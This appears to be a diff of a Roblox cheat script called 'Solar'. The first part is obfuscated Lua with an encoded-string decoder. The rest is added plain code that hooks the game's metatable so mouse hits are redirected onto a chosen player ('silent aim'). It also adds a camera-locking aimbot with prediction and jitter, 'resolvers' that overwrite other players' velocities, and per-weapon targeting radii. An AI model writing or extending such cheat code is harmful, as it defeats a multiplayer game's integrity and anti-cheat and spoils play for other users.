-1;end if (v131==(1 + 0)) then v105=(1718 -(1408 + 29)) -(211 + (236 -167));break;end end end if (v105==(1332 -(305 + 1026))) then if v11 then if (getgenv().Solar.Silent.Enabled and v11.Character and getgenv().Solar.Silent.ClosestPart) then getgenv().Solar.Silent.Part=tostring(v34(v11.Character));end end break;end end break;end end end end);local v43={[v7("\119\62\74\89\70\61\94\37\87","\49\75\36\58\50\84")]={}};v43.Functions.getToolName=function(v44)local v98=809 -(30 + 779);local v99;local v100;while true do if (v98==((157 -(101 + 56)) + 0 + 0)) then v99=0 + 0;v100=nil;v98=1 + 0;end if (v98==1) then while true do if (v99==((0 + 0) -(993 -(809 + 184)))) then local v121=0;while true do if (v121==0) then v100=string.split(string.split(v44,"[")[(144 + 883) -((1944 -(709 + 585)) + (1217 -842))],"]")[750 -(285 + 464)];return v100;end end end end break;end end end;v43.Functions.getEquippedWeaponName=function()local v101=891 -(807 + 84);local v102;while true do if (v101==((0 -0) -(0 + 0))) then v102=0 + 0;while true do if (v102==(1808 -(1516 + 292))) then local v122=0;local v123;while true do if (v122==0) then v123=(0 -0) -0;while true do if (v123==((1491 -(659 + 832)) + 0)) then if (v14.Character and v14.Character:FindFirstChildWhichIsA(v7("\192\202\184\188","\148\165\215\208\187\119\195"))) then local v189=(0 -0) + (314 -(144 + 170));local v190;local v191;while true do if (((3080 -(370 + 1280)) -((855 -(31 + 342)) + 948))==v189) then v190=0 + 0;v191=nil;v189=1;end if (v189==(1672 -((2154 -(485 + 22)) + (39 -15)))) then while true do if (v190==(0 + 0 + 0 + 0)) then v191=v14.Character:FindFirstChildWhichIsA(v7("\154\44\44\94","\206\67\67\50\221\226"));if (string.find(v191.Name,v7("\191\202","\154\145\90\217\72\187\89\151")) and string.find(v191.Name,v7("\206\146","\235\207\100\26\127\69")) and  not string.find(v191.Name,v7("\15\85\64\237\26\214","\88\52\44\129\127\162\79\34")) and  not string.find(v191.Name,v7("\212\198\176\204\45","\132\174\223\162\72\108\114"))) then return v43.Functions.getToolName(v191.Name);end break;end end break;end end end return nil;end end break;end end end end break;end end end;v16.RenderStepped:Connect(function()if (v43.Functions.getEquippedWeaponName()~=nil) then local v106=(0 -0) -(0 + 0);local v107;local v108;while true do if (v106==(703 -((775 -(625 + 21)) + (1396 -(262 + 560))))) then local v116=0;while true do if (v116==1) then v106=1 -(0 -0);break;end if (v116==0) then v107=(5497 -3503) -(133 + (2917 -(510 + 546)));v108=nil;v116=1;end end end if (v106==1) then while true do if (v107==(175 -((648 -483) + (15 -5)))) then v108=getgenv().Solar.GunFOV[v43.Functions.getEquippedWeaponName()];if ((v108~=nil) and (getgenv().Solar.GunFOV.Enabled==true)) then getgenv().Solar.SilentFOV.Radius=v108.FOV;else getgenv().Solar.SilentFOV.Radius=getgenv().Solar.SilentFOV.Radius;end break;end end break;end end end end);
+Mouse.KeyDown:Connect(function(Key)
+    local Keybind = getgenv().Solar.Both.UnderGroundKey:lower()
+    if (Key == Keybind) and getgenv().Solar.Both.UseUnderGroundKeybind == true then
+            if getgenv().Solar.Both.UnderGroundReolver == true then
+				getgenv().Solar.Both.UnderGroundReolver = false
+                if getgenv().Solar.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Solar",
+                            Text = "Disabled UnderGround Resolver",
+                            Icon = "",
+                            Duration = 1
+                        }
+                    )
+                end
+            else
+				getgenv().Solar.Both.UnderGroundReolver = true
+                if getgenv().Solar.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Solar",
+                            Text = "Enabled UnderGround Resolver",
+                            Icon = "",
+                            Duration = 1
+                        }
+                    )
+                end
+            end
+        end
+    end
+)
+
+Mouse.KeyDown:Connect(function(Key)
+    local Keybind = getgenv().Solar.Both.DetectDesyncKey:lower()
+    if (Key == Keybind) and getgenv().Solar.Both.UsDetectDesyncKeybind == true then
+            if getgenv().Solar.Both.DetectDesync == true then
+				getgenv().Solar.Both.DetectDesync = false
+                if getgenv().Solar.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Solar",
+                            Text = "Disabled Desync Resolver",
+                            Icon = "",
+                            Duration = 1
+                        }
+                    )
+                end
+            else
+				getgenv().Solar.Both.DetectDesync = true
+                if getgenv().Solar.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Solar",
+                            Text = "Enabled Desync Resolver",
+                            Icon = "",
+                            Duration = 1
+                        }
+                    )
+                end
+            end
+        end
+    end
+)
+
+local grmt = getrawmetatable(game)
+local backupindex = grmt.__index
+setreadonly(grmt, false)
+
+grmt.__index = newcclosure(function(self, v)
+    if (getgenv().Solar.Silent.Enabled and Mouse and tostring(v) == "Hit") then
+        if Prey and Prey.Character then
+    		if getgenv().Solar.Silent.PredictMovement then
+    			local endpoint = game.Players[tostring(Prey)].Character[getgenv().Solar.Silent.Part].CFrame + (
+    				game.Players[tostring(Prey)].Character[getgenv().Solar.Silent.Part].Velocity * getgenv().Solar.Silent.PredictionVelocity
+    			)
+    			return (tostring(v) == "Hit" and endpoint)
+    		else
+    			local endpoint = game.Players[tostring(Prey)].Character[getgenv().Solar.Silent.Part].CFrame
+    			return (tostring(v) == "Hit" and endpoint)
+    		end
+        end
+    end
+    return backupindex(self, v)
+end)
+
+RS.Heartbeat:Connect(function()
+	if getgenv().Solar.Silent.Enabled then
+	    if Prey and Prey.Character and Prey.Character:WaitForChild(getgenv().Solar.Silent.Part) then
+            if getgenv().Solar.Both.DetectDesync == true and Prey.Character:WaitForChild("HumanoidRootPart").Velocity.magnitude > getgenv().Solar.Both.DesyncDetection then            
+                pcall(function()
+                    local TargetVel = Prey.Character[getgenv().Solar.Silent.Part]
+                    TargetVel.Velocity = Vector3.new(0, 0, 0)
+                    TargetVel.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                end)
+            end
+            if getgenv().Solar.Silent.AntiGroundShots == true and Prey.Character:FindFirstChild("Humanoid") == Enum.HumanoidStateType.Freefall then
+                pcall(function()
+                    local TargetVelv5 = Prey.Character[getgenv().Solar.Silent.Part]
+                    TargetVelv5.Velocity = Vector3.new(TargetVelv5.Velocity.X, (TargetVelv5.Velocity.Y * 0.5), TargetVelv5.Velocity.Z)
+                    TargetVelv5.AssemblyLinearVelocity = Vector3.new(TargetVelv5.Velocity.X, (TargetVelv5.Velocity.Y * 0.5), TargetVelv5.Velocity.Z)
+                end)
+            end
+            if getgenv().Solar.Both.UnderGroundReolver == true then            
+                pcall(function()
+                    local TargetVelv2 = Prey.Character[getgenv().Solar.Silent.Part]
+                    TargetVelv2.Velocity = Vector3.new(TargetVelv2.Velocity.X, 0, TargetVelv2.Velocity.Z)
+                    TargetVelv2.AssemblyLinearVelocity = Vector3.new(TargetVelv2.Velocity.X, 0, TargetVelv2.Velocity.Z)
+                end)
+            end
+	    end
+	end
+    if getgenv().Solar.Tracer.Enabled == true then
+        if getgenv().Solar.Both.DetectDesync == true and Plr and Plr.Character and Plr.Character:WaitForChild(getgenv().Solar.Tracer.Part) and Plr.Character:WaitForChild("HumanoidRootPart").Velocity.magnitude > getgenv().Solar.Both.DesyncDetection then
+            pcall(function()
+                local TargetVelv3 = Plr.Character[getgenv().Solar.Tracer.Part]
+                TargetVelv3.Velocity = Vector3.new(0, 0, 0)
+                TargetVelv3.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            end)
+        end
+        if getgenv().Solar.Both.UnderGroundReolver == true and Plr and Plr.Character and Plr.Character:WaitForChild(getgenv().Solar.Tracer.Part)then
+            pcall(function()
+                local TargetVelv4 = Plr.Character[getgenv().Solar.Tracer.Part]
+                TargetVelv4.Velocity = Vector3.new(TargetVelv4.Velocity.X, 0, TargetVelv4.Velocity.Z)
+                TargetVelv4.AssemblyLinearVelocity = Vector3.new(TargetVelv4.Velocity.X, 0, TargetVelv4.Velocity.Z)
+            end)
+        end
+    end
+end)
+
+RS.RenderStepped:Connect(function()
+	if getgenv().Solar.Silent.Enabled then
+        if getgenv().Solar.Silent.CheckIf_KO == true and Prey and Prey.Character then 
+            local KOd = Prey.Character:WaitForChild("BodyEffects")["K.O"].Value
+            local Grabbed = Prey.Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+            if KOd or Grabbed then
+                Prey = nil
+            end
+        end
+	end
+    if getgenv().Solar.Tracer.Enabled == true then
+        if getgenv().Solar.Tracer.CheckIf_KO == true and Plr and Plr.Character then 
+            local KOd = Plr.Character:WaitForChild("BodyEffects")["K.O"].Value
+            local Grabbed = Plr.Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+            if KOd or Grabbed then
+                Plr = nil
+                IsTargetting = false
+            end
+        end
+		if getgenv().Solar.Tracer.DisableTargetDeath == true and Plr and Plr.Character:FindFirstChild("Humanoid") then
+			if Plr.Character.Humanoid.health < 4 then
+				Plr = nil
+				IsTargetting = false
+			end
+		end
+		if getgenv().Solar.Tracer.DisableLocalDeath == true and Plr and Plr.Character:FindFirstChild("Humanoid") then
+			if Client.Character.Humanoid.health < 4 then
+				Plr = nil
+				IsTargetting = false
+			end
+		end
+        if getgenv().Solar.Tracer.DisableOutSideCircle == true and Plr and Plr.Character and Plr.Character:WaitForChild("HumanoidRootPart") then
+            if
+            TracerCircle.Radius <
+                (Vector2.new(
+                    Camera:WorldToScreenPoint(Plr.Character.HumanoidRootPart.Position).X,
+                    Camera:WorldToScreenPoint(Plr.Character.HumanoidRootPart.Position).Y
+                ) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+             then
+                Plr = nil
+                IsTargetting = false
+            end
+        end
+		if getgenv().Solar.Tracer.PredictMovement and Plr and Plr.Character and Plr.Character:FindFirstChild(getgenv().Solar.Tracer.Part) then
+			if getgenv().Solar.Tracer.UseShake then
+				local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().Solar.Tracer.Part].Position + Plr.Character[getgenv().Solar.Tracer.Part].Velocity * getgenv().Solar.Tracer.PredictionVelocity +
+				Vector3.new(
+					math.random(-getgenv().Solar.Tracer.ShakeValue, getgenv().Solar.Tracer.ShakeValue),
+					math.random(-getgenv().Solar.Tracer.ShakeValue, getgenv().Solar.Tracer.ShakeValue),
+					math.random(-getgenv().Solar.Tracer.ShakeValue, getgenv().Solar.Tracer.ShakeValue)
+				) * 0.1)
+				Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().Solar.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+			else
+    			local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().Solar.Tracer.Part].Position + Plr.Character[getgenv().Solar.Tracer.Part].Velocity * getgenv().Solar.Tracer.PredictionVelocity)
+    			Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().Solar.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+			end
+		elseif getgenv().Solar.Tracer.PredictMovement == false and Plr and Plr.Character and Plr.Character:FindFirstChild(getgenv().Solar.Tracer.Part) then
+			if getgenv().Solar.Tracer.UseShake then
+				local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().Solar.Tracer.Part].Position +
+				Vector3.new(
+					math.random(-getgenv().Solar.Tracer.ShakeValue, getgenv().Solar.Tracer.ShakeValue),
+					math.random(-getgenv().Solar.Tracer.ShakeValue, getgenv().Solar.Tracer.ShakeValue),
+					math.random(-getgenv().Solar.Tracer.ShakeValue, getgenv().Solar.Tracer.ShakeValue)
+				) * 0.1)
+				Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().Solar.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+		    else
+    			local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().Solar.Tracer.Part].Position)
+    			Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().Solar.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+		    end
+		end
+	end
+end)
+
+task.spawn(function ()
+    while task.wait() do
+    	if getgenv().Solar.Silent.Enabled then
+            Prey = ClosestPlrFromMouse()
+    	end
+        if Plr then
+            if getgenv().Solar.Tracer.Enabled and (Plr.Character) and getgenv().Solar.Tracer.ClosestPart then
+                getgenv().Solar.Tracer.Part = tostring(GetClosestBodyPartV2(Plr.Character))
+            end
+        end
+        if Prey then
+            if getgenv().Solar.Silent.Enabled and (Prey.Character) and getgenv().Solar.Silent.ClosestPart then
+                getgenv().Solar.Silent.Part = tostring(GetClosestBodyPart(Prey.Character))
+            end
+        end
+    end
+end)
+
+local Script = {Functions = {}}
+    Script.Functions.getToolName = function(name)
+        local split = string.split(string.split(name, "[")[2], "]")[1]
+        return split
+    end
+    Script.Functions.getEquippedWeaponName = function()
+        if (Client.Character) and Client.Character:FindFirstChildWhichIsA("Tool") then
+           local Tool =  Client.Character:FindFirstChildWhichIsA("Tool")
+           if string.find(Tool.Name, "%[") and string.find(Tool.Name, "%]") and not string.find(Tool.Name, "Wallet") and not string.find(Tool.Name, "Phone") then
+              return Script.Functions.getToolName(Tool.Name)
+           end
+        end
+        return nil
+    end
+    RS.RenderStepped:Connect(function()
+    if Script.Functions.getEquippedWeaponName() ~= nil then
+        local WeaponSettings = getgenv().Solar.GunFOV[Script.Functions.getEquippedWeaponName()]
+        if WeaponSettings ~= nil and getgenv().Solar.GunFOV.Enabled == true then
+            getgenv().Solar.SilentFOV.Radius = WeaponSettings.FOV
+        else
+            getgenv().Solar.SilentFOV.Radius = getgenv().Solar.SilentFOV.Radius
+        end
+    end
+end)
